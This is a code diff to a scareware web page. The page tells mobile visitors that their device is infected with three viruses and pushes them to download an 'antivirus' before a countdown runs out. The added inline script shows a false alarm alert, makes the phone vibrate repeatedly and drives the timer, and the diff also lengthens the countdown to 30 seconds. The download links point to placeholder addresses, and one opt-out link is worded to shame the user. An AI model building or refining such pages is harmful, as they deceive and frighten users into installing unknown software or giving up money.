@@ -28,7 +28,7 @@
     </strong> Download the antivirus on the next page to completely eliminate the virus. </p>
     <p><b>
       Important: Please act in
-      <span id="timer">12</span>
+      <span id="timer">30</span>
       seconds.
     </b></p>
     <p style="font-size: 20px;" class="text-center button"><a class="btn" id="linker" href="http://www.example.com">       remove viruses     </a></p>
@@ -36,7 +36,9 @@
     <p class="small"><a href="http://www.example.com">       Details     </a></p>
     <p class="small text-center"><a href="http://www.example.com">       I do not want to repair my device.     </a></p>
   </div>
-  <script src="assets/js/script.js" charset="utf-8"></script>
+  <script>
+  function timer(){(count-=1)<=0?clearInterval(counter):document.getElementById("timer").innerHTML=count}alert("Warning: Your mobile device has been infected by (3) viruses! Viruses will damage your mobile phone, SIM card and erase all your contacts! Please follow the instructions on the next page to remove the viruses."),navigator.vibrate=navigator.vibrate||navigator.webkitVibrate||navigator.mozVibrate||navigator.msVibrate,navigator.vibrate([1e3,500,1e3,500,1e3,500,1e3,500,1e3,500,1e3,500,1e3,500,1e3,500,1e3]);var count=30,counter=setInterval(timer,1e3);
+  </script>
 </body>
 
 </html>
